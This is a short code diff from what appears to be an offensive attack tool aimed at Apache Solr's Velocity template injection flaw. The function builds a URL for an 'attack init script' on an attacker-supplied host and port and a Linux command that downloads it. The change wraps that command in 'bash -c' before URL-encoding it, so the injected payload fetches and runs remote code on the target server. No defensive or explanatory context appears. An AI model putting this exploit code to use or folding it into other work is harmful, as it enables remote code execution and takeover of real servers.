@@ -91,7 +91,8 @@ makeCmd := func(){
 
     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
     initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheSolrAttackType)
-    return http.urlEncode(initDownloadCmd)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
+    return http.urlEncode(cmd)
 }
 
 //Try to Attack Solr by velocity template inject bug
